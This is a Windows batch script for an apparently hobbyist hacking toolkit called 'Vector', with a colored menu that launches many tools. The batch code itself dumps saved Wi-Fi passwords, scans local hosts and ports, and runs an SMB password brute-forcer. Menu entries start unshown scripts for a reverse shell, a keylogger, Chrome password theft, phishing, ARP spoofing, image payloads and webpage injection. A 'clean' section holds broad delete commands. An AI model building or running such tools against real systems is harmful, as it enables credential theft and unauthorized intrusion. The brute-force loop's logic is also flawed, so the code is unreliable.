@echo off
title Vector
chcp 65001 >nul
setlocal EnableDelayedExpansion
cls
:: Get ESC character safely
for /f "delims=" %%e in ('powershell -NoProfile -Command "[char]27"') do set "ESC=%%e"

:: Define colored separator line
set "LINE=%ESC%[38;5;214m=========================================%ESC%[0m"

echo %ESC%[38;5;214m                                          ====..::%ESC%[0m
echo %ESC%[38;5;214m                                        :.+=-.::--::%ESC%[0m
echo %ESC%[38;5;214m                                       --++*+++++==- %ESC%[0m
echo %ESC%[38;5;214m                                       **+=%%*%%@@**=#%ESC%[0m
echo %ESC%[38;5;214m                                        *=+*++=+==::=%ESC%[0m
echo %ESC%[38;5;214m                                        ##:==+-+#:*#%ESC%[0m
echo %ESC%[38;5;214m                                            -==+*#%ESC%[0m
echo %ESC%[38;5;214m                                              :*%%##%ESC%[0m
echo %ESC%[38;5;214m                                           =====+****++%ESC%[0m
echo %ESC%[38;5;214m                                        ===++*==+*#+**++==--%ESC%[0m
echo %ESC%[38;5;214m                                     ==++**+--==+*#=::-+**+===+%ESC%[0m
echo %ESC%[38;5;214m                                   =+**#+=:.:=-=+*#+-....:+###*+--%ESC%[0m
echo %ESC%[38;5;214m                                 ==##*=:...:====+*##+:..::..:-= ====%ESC%[0m
echo %ESC%[38;5;214m                               ===  -..:..:=-==++**#+--...:::=%ESC%[0m
echo %ESC%[38;5;214m                                    =-...-=+++=++**##=:=:...-%ESC%[0m
echo %ESC%[38;5;214m                                     =---:-+=++++*###=-:-=--%ESC%[0m
echo %ESC%[38;5;214m                                      =:::-++++++**##=-:::==%ESC%[0m
echo %ESC%[38;5;214m                                      =--:-+*##****##+::::=%ESC%[0m
echo %ESC%[38;5;214m                                       -::=+*#+=-**##+-::=%ESC%[0m
echo %ESC%[38;5;214m                                       =:=++**--:**##+=:-=%ESC%[0m
echo %ESC%[38;5;214m                                       =+-+*#+--:-**#+-+=%ESC%[0m
echo %ESC%[38;5;214m                                        =-**+=-=::+*#*=-+%ESC%[0m
echo %ESC%[38;5;214m                                        =+**+--+::-*##=+%ESC%[0m
echo %ESC%[38;5;214m                                        ****+--+---=##**%ESC%[0m
echo %ESC%[38;5;214m                                        ###+=-++=---###%ESC%[0m
echo %ESC%[38;5;214m                                       ::-+#      +==#%%%ESC%[0m
echo %ESC%[38;5;214m                                     :::*            --*%ESC%[0m
echo %ESC%[38;5;214m                                                     =--=%ESC%[0m
pause
:menu
cls
echo %ESC%[38;5;214m	██╗░░░██╗███████╗░█████╗░████████╗░█████╗░██████╗░%ESC%[0m
echo %ESC%[38;5;214m	██║░░░██║██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗%ESC%[0m
echo %ESC%[38;5;214m	╚██╗░██╔╝█████╗░░██║░░╚═╝░░░██║░░░██║░░██║██████╔╝%ESC%[0m
echo %ESC%[38;5;214m	░╚████╔╝░██╔══╝░░██║░░██╗░░░██║░░░██║░░██║██╔══██╗%ESC%[0m
echo %ESC%[38;5;214m	░░╚██╔╝░░███████╗╚█████╔╝░░░██║░░░╚█████╔╝██║░░██║%ESC%[0m
echo %ESC%[38;5;214m	░░░╚═╝░░░╚══════╝░╚════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝%ESC%[0m
echo %ESC%[38;5;214m	CameronCodesStuff%ESC%[0m
echo.
echo %ESC%[38;5;214m	╔═(0). Help			╔═(5). Web-Scraper%ESC%[0m
echo %ESC%[38;5;214m	║				║[0m
echo %ESC%[38;5;214m	╠══(1). WIFI			╠══(6).Email Spam%ESC%[0m
echo %ESC%[38;5;214m	║ 				║[0m
echo %ESC%[38;5;214m	╠═══(2). IP Geolocator		╠═══(7).ETH Wallet%ESC%[0m
echo %ESC%[38;5;214m	║  				║[0m
echo %ESC%[38;5;214m	╠════(3). Scanner	        ╠════(8). API Map%ESC%[0m
echo %ESC%[38;5;214m	║				║[0m
echo %ESC%[38;5;214m	╠═════(4). ScannerV2		╚═════(9).Vulnerabilty Scan%ESC%[0m
echo %ESC%[38;5;214m	║[0m
echo %ESC%[38;5;214m	╚╦════(99). Exit%ESC%[0m
echo %ESC%[38;5;214m 	 ║[0m  
set /p choice=%ESC%[38;5;214m     	 ╚══════^> %ESC%[0m

if "%choice%"=="0" goto help
if "%choice%"=="1" goto wifi
if "%choice%"=="2" goto geo
if "%choice%"=="3" goto scan
if "%choice%"=="4" goto scan2
if "%choice%"=="ip" goto ip
if "%choice%"=="99" exit
if "%choice%"=="000" goto secret
if "%choice%"=="smb" goto smb
if "%choice%"=="clean" goto clean
if "%choice%"=="task" goto task
if "%choice%"=="shutdown" goto shutdown
if "%choice%"=="7" start python/Wallet.pyw
if "%choice%"=="6" start python/EmailAuto.pyw
if "%choice%"=="5" start python/advanced-webscraper.pyw
if "%choice%"=="8" start python/API-endpoint-mapper.pyw
if "%choice%"=="9" start python/web-vulnerability-scanner.pyw
if "%choice%"=="cc" start python/ccgen.pyw
if "%choice%"=="miner" start python/ArtemisMiner.pyw
if "%choice%"=="btcbuy" start python/btcbuy.pyw
if "%choice%"=="ebola" start extra\EbolaPuller.bat
if "%choice%"=="chromepass" start extra/ChromePass.exe
if "%choice%"=="minerdashboard" start python/minerdashboard.pyw
if "%choice%"=="htmlserver" start python/htmlserver.py
if "%choice%"=="convert" start python/convert.py
if "%choice%"=="webhook" start python/webhook.py
if "%choice%"=="reverseshell" start python/reverseshell.py
if "%choice%"=="bloodhound" start python/bloodhound.py
if "%choice%"=="keylog" start python/keylogger.py
if "%choice%"=="remote" start python/remotecontroll.py
if "%choice%"=="system" start python/system.py
if "%choice%"=="network" start python/network.py
if "%choice%"=="phish" start python/phish.py
if "%choice%"=="image" start python/image.py
if "%choice%"=="imagepayload" start python/imagepayload.py
if "%choice%"=="cast" start python/chromecast.py
if "%choice%"=="inject" start python\extra\launchinject.bat
if "%choice%"=="wifi" start python\crack.py
if "%choice%"=="aivuln" start python\aivuln.py
if "%choice%"=="ide" start python\ide.pyw
if "%choice%"=="browser" start python\browser.pyw
if "%choice%"=="phone" start python\phonetracker.pyw
if "%choice%"=="controller" start python\phantomcontroller.py
if "%choice%"=="castv2" start python\chromecastv2.py

goto menu

:help
cls
echo %ESC%[38;5;214mPython scripts will take a few seconds to load...%ESC%[0m
echo.
echo %ESC%[38;5;214mVector Scripts%ESC%[0m
echo %ESC%[38;5;214mWifi               - shows saved wifi passwords%ESC%[0m
echo %ESC%[38;5;214mIp Geolcator       - locates an IP%ESC%[0m
echo %ESC%[38;5;214mScanner            - scans your local network%ESC%[0m
echo %ESC%[38;5;214mScannerV2          - Scans your local network and provides details%ESC%[0m
echo %ESC%[38;5;214mWallet             - ETH Wallet%ESC%[0m
echo %ESC%[38;5;214mEmailAuto          - Spam sends emails%ESC%[0m
echo %ESC%[38;5;214mWebscraper         - Scrapes a website for info%ESC%[0m
echo %ESC%[38;5;214mAPI Map            - Scrapes APIS from a website%ESC%[0m
echo %ESC%[38;5;214mVulnerabilty Scan  - Scans a website for Vulnerabiltys%ESC%[0m
echo.
echo.
echo %ESC%[38;5;214mVector Commands%ESC%[0m
echo %ESC%[38;5;214m"000"              - Secret Windows managers%ESC%[0m
echo %ESC%[38;5;214m"ip"               - IP changer%ESC%[0m
echo %ESC%[38;5;214m"smb"              - SMB Bruteforcer %ESC%[0m
echo %ESC%[38;5;214m"clean"            - Cleans your computer%ESC%[0m
echo %ESC%[38;5;214m"task"             - Opens task manager%ESC%[0m
echo %ESC%[38;5;214m"shutdown"         - Shutdowns your computer%ESC%[0m
echo %ESC%[38;5;214m"cc"               - Fake credit card generator%ESC%[0m
echo %ESC%[38;5;214m"miner"            - Fake crypto miner%ESC%[0m
echo %ESC%[38;5;214m"btcbuy"           - Fake crypto buyer%ESC%[0m
echo %ESC%[38;5;214m"ebola"            - Ebola Puller%ESC%[0m
echo %ESC%[38;5;214m"chromepass"       - Chrome Pass%ESC%[0m
echo %ESC%[38;5;214m"minerdashboard"   - Fake crypto dashboard%ESC%[0m
echo %ESC%[38;5;214m"htmlserver"       - Locally host HTML%ESC%[0m
echo %ESC%[38;5;214m"convert"          - Converts py and bat to exe%ESC%[0m
echo %ESC%[38;5;214m"webhook"          - Spams a discord webhook%ESC%[0m
echo %ESC%[38;5;214m"reverseshell"     - Payload generator%ESC%[0m
echo %ESC%[38;5;214m"bloodhound"       - Vulnerability scanner%ESC%[0m
echo %ESC%[38;5;214m"keylog"           - Keylogger%ESC%[0m
echo %ESC%[38;5;214m"remote"           - Remote controll computers%ESC%[0m
echo %ESC%[38;5;214m"system"           - System monitor%ESC%[0m
echo %ESC%[38;5;214m"network"          - Network ARP spoof%ESC%[0m
echo %ESC%[38;5;214m"phish"            - Phishing attack%ESC%[0m
echo %ESC%[38;5;214m"image"            - Image foresnics%ESC%[0m
echo %ESC%[38;5;214m"imagepayload"     - Image payload creator%ESC%[0m
echo %ESC%[38;5;214m"cast"             - Chromecast control%ESC%[0m
echo %ESC%[38;5;214m"inject"           - Injects code into webpages%ESC%[0m
echo %ESC%[38;5;214m"wifi"             - Shows saved wifi using py%ESC%[0m
echo %ESC%[38;5;214m"aivuln"           - AI vulnerability scanner%ESC%[0m
echo %ESC%[38;5;214m"ide"              - AI code generator%ESC%[0m
echo %ESC%[38;5;214m"browser"          - Simple browser%ESC%[0m
echo %ESC%[38;5;214m"phone"            - Tracks phone numbers%ESC%[0m
echo %ESC%[38;5;214m"controller"       - Phantom controller%ESC%[0m
echo %ESC%[38;5;214m"castv2"           - Chromecast Control V2%ESC%[0m

echo.
pause
goto menu

:wifi
cls
echo %LINE%
echo %ESC%[38;5;214mSaved Wi-Fi Networks and Passwords%ESC%[0m
echo %LINE%

for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
    set "ssid=%%A"
    set "ssid=!ssid:~1!"
    echo %ESC%[38;5;214mSSID: !ssid!%ESC%[0m
    netsh wlan show profile name="!ssid!" key=clear | findstr "Key Content"
    echo %ESC%[38;5;214m-----------------------------------%ESC%[0m
)
pause
goto menu


:geo
cls
echo %LINE%
echo %ESC%[38;5;214mIP Geolocator%ESC%[0m
echo %LINE%

set /p target=%ESC%[38;5;214mEnter IP address: %ESC%[0m

powershell -Command ^
"$ESC=[char]27; ^
$ip='%target%'; ^
$data=Invoke-RestMethod -Uri ('http://ip-api.com/json/' + $ip); ^
Write-Host ('{0}[38;5;214mIP:{0}[0m {1}' -f $ESC, $data.query); ^
Write-Host ('{0}[38;5;214mCountry:{0}[0m {1}' -f $ESC, $data.country); ^
Write-Host ('{0}[38;5;214mCity:{0}[0m {1}' -f $ESC, $data.city); ^
Write-Host ('{0}[38;5;214mISP:{0}[0m {1}' -f $ESC, $data.isp)"

pause
goto menu


:scan
cls
echo %LINE%
echo %ESC%[38;5;214mNETWORK INFORMATION%ESC%[0m
echo %LINE%

for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /C:"IPv4 Address"') do set IP=%%a
set IP=%IP:~1%

echo Your Local IP: %IP%

for /f "tokens=1-3 delims=." %%a in ("%IP%") do set subnet=%%a.%%b.%%c

echo Detected Subnet: %subnet%.0/24
echo.
echo %LINE%
echo %ESC%[38;5;214mSCANNING ACTIVE DEVICES%ESC%[0m
echo %LINE%

for /L %%i in (1,1,254) do (
    ping -n 1 -w 50 %subnet%.%%i >nul
    if not errorlevel 1 echo Device Found: %subnet%.%%i
)

echo.
echo %LINE%
echo %ESC%[38;5;214mCHECKING COMMON PORTS%ESC%[0m
echo %LINE%

set ports=21 22 23 80 443 3389

for /L %%i in (1,1,254) do (
    ping -n 1 -w 50 %subnet%.%%i >nul
    if not errorlevel 1 (
        for %%p in (%ports%) do (
            powershell -command "if(Test-NetConnection -ComputerName %subnet%.%%i -Port %%p -InformationLevel Quiet){echo %subnet%.%%i : Port %%p OPEN}"
        )
    )
)

echo.
echo %LINE%
echo %ESC%[38;5;214mSCAN COMPLETE%ESC%[0m
echo %LINE%
pause
goto menu

:scan2
echo %ESC%[38;5;214mScanning Network...%ESC%[0m
for /L %%i in (1,1,254) do (
    ping -n 1 -w 100 192.168.1.%%i | find "Reply"
)
pause
setlocal

set SCRIPT=network_scan.ps1

echo Creating PowerShell scanner...

(
echo $arpEntries = arp -a ^| Select-String "dynamic"
echo foreach ($entry in $arpEntries^) ^{
echo     $parts = $entry -split "\s+"
echo     $ip = $parts[1]
echo     $mac = $parts[2] -replace "-", ":"
echo     Write-Host "IP Address : $ip"
echo     Write-Host "MAC Address: $mac"
echo     try ^{
echo         $hostname = [System.Net.Dns]::GetHostEntry($ip^).HostName
echo     ^} catch ^{
echo         $hostname = "Unknown"
echo     ^}
echo     Write-Host "Hostname   : $hostname"
echo     try ^{
echo         $vendor = Invoke-RestMethod "https://api.macvendors.com/$mac"
echo     ^} catch ^{
echo         $vendor = "Unknown"
echo     ^}
echo     Write-Host "Vendor     : $vendor"
echo     Write-Host "---------------------------------------"
echo ^}
) > "%SCRIPT%"

echo.
echo Running scanner...
echo.

powershell -NoProfile -ExecutionPolicy Bypass -File "%SCRIPT%"

pause
goto menu

:ip
color 0B
setlocal enabledelayedexpansion

cls
echo ===============================
echo   AUTO IP RENEWER (SMART)
echo ===============================
echo.

:: Ask user for interval
set /p interval=Enter interval in seconds: 
if "%interval%"=="" exit

:: Detect active adapter
for /f "tokens=1,* delims=:" %%A in ('netsh interface show interface ^| findstr /C:"Connected"') do (
    set adapter=%%B
)

:: Remove leading spaces
for /f "tokens=* delims= " %%A in ("!adapter!") do set adapter=%%A

echo.
echo Active Adapter Detected:
echo !adapter!
timeout /t 2 >nul

:loop
echo Using Adapter: !adapter!
echo.
echo Releasing IP...
ipconfig /release "!adapter!" >nul

timeout /t 2 >nul

echo Renewing IP...
ipconfig /renew "!adapter!" >nul

timeout /t 2 >nul

echo.
echo ===== NEW IPv4 ADDRESS =====

for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /C:"IPv4 Address"') do (
    echo %%A
)

echo.
echo Next change in %interval% seconds...
timeout /t %interval% >nul
goto loop
pause
goto menu


:secret
echo %ESC%[38;5;214m1 - System Information%ESC%[0m
echo %ESC%[38;5;214m2 - Resource Monitor%ESC%[0m
echo %ESC%[38;5;214m3 - Services%ESC%[0m
echo %ESC%[38;5;214m4 - Reliability Monitor%ESC%[0m
echo %ESC%[38;5;214m5 - Network Connections%ESC%[0m
echo %ESC%[38;5;214m6 - Full Control Panel (God Mode)%ESC%[0m
echo %ESC%[38;5;214m7 - Exit%ESC%[0m
echo.
set /p choice=Select an option:

if "%choice%"=="1" start msinfo32
if "%choice%"=="2" start resmon
if "%choice%"=="3" start services.msc
if "%choice%"=="4" start perfmon /rel
if "%choice%"=="5" start ncpa.cpl
if "%choice%"=="6" start explorer shell:::{21EC2020-3AEA-1069-A2DD-08002B30309D}
if "%choice%"=="7" exit
pause

:smb
cls
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
goto menu

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
goto menu

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
pause
goto menu

:clean
color 0A
echo ===========================================
echo        PC Optimizer & Cleaner
echo ===========================================
echo.

:: Ask for admin rights
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    echo Please run this script as Administrator!
    pause
    exit
)

:: 1. Clean Temp Files
echo Cleaning temporary files...
del /s /q "%temp%\*.*"
rd /s /q "%temp%"
mkdir "%temp%"
echo Done cleaning temp files.
echo.

:: 2. Clean Windows Prefetch
echo Cleaning prefetch files...
del /s /q "C:\Windows\Prefetch\*.*"
echo Done cleaning prefetch.
echo.

:: 3. Clear Windows Update cache
echo Cleaning Windows Update cache...
net stop wuauserv
del /s /q "C:\Windows\SoftwareDistribution\Download\*.*"
net start wuauserv
echo Done cleaning update cache.
echo.

:: 4. Clear Recycle Bin
echo Emptying Recycle Bin...
powershell -command "Clear-RecycleBin -Force"
echo Done emptying Recycle Bin.
echo.

:: 5. Disable unnecessary startup programs
echo Disabling unnecessary startup items...
:: This disables common bloatware startups. Add more as needed.
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDrive" /t REG_SZ /d "" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Skype" /t REG_SZ /d "" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Spotify" /t REG_SZ /d "" /f >nul 2>&1
echo Done disabling startup items.
echo.

:: 6. Clear DNS cache
echo Flushing DNS cache...
ipconfig /flushdns
echo Done flushing DNS.
echo.

:: 7. Disk Cleanup (System files)
echo Running Disk Cleanup...
cleanmgr /sagerun:1
echo Disk Cleanup complete.
echo.

:: 8. Optimize and defragment drives
echo Optimizing drives...
defrag C: /O
echo Drive optimization complete.
echo.

echo ===========================================
echo PC Optimization and Cleaning Complete!
echo ===========================================
pause

:task
REM Open Task Manager
start taskmgr.exe
goto menu

:shutdown
shutdown /p /f
goto menu


goto menu
